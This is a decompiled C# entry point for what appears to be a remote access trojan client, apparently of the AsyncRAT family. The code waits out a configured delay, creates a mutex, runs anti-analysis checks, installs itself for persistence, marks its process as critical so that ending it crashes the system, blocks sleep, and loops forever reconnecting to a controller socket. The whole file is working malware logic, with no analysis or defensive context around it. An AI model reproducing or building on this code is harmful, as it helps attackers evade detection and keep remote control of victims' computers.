using System;
using System.Threading;
using Client.Connection;
using Client.Helper;
using Client.Install;

namespace Client
{
	// Token: 0x02000002 RID: 2
	public class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002608 File Offset: 0x00000808
		public static void Main()
		{
			for (int i = 0; i < Convert.ToInt32(Settings.Delay); i++)
			{
				Thread.Sleep(1000);
			}
			if (!Settings.InitializeSettings())
			{
				Environment.Exit(0);
			}
			try
			{
				if (!MutexControl.CreateMutex())
				{
					Environment.Exit(0);
				}
				if (Convert.ToBoolean(Settings.Anti))
				{
					Anti_Analysis.RunAntiAnalysis();
				}
				if (Convert.ToBoolean(Settings.Install))
				{
					NormalStartup.Install();
				}
				if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
				{
					ProcessCritical.Set();
				}
				Methods.PreventSleep();
			}
			catch
			{
			}
			for (;;)
			{
				try
				{
					if (!ClientSocket.IsConnected)
					{
						ClientSocket.Reconnect();
						ClientSocket.InitializeClient();
					}
				}
				catch
				{
				}
				Thread.Sleep(5000);
			}
		}
	}
}
